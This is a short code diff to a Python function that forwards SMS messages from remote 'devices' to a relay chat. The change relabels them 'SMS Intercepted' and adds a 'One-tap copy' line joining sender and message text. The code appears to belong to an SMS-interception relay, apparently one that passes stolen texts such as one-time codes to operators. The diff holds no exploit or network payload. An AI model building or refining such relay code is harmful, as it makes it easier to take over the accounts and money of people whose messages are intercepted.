@@ -2451,13 +2451,21 @@ async def notify_admins(text: str) -> bool:
 async def relay_forward_incoming(device: dict, address: str, body: str):
     if not body or is_banned(address):
         return
+
+    address = address or "n/a"
+
+    escaped_address = html.escape(address)
+    escaped_body = html.escape(body)
+
     text = (
-        "📥 <b>INCOMING SMS</b>\n"
-        f"Device: <code>{device_short_id(device)}</code>\n"
-        f"From: <code>{html.escape(address or 'n/a')}</code>\n"
+        "📱 <b>SMS Intercepted</b>\n"
         "━━━━━━━━━━━━━━\n"
-        f"{html.escape(body)}"
+        f"📞 To: <code>{escaped_address}</code>\n"
+        f"💬 Message: {escaped_body}\n\n"
+        "📋 <b>One-tap copy:</b>\n"
+        f"<code>{escaped_address} | {escaped_body}</code>"
     )
+
     await relay_send_text(text)
 
 
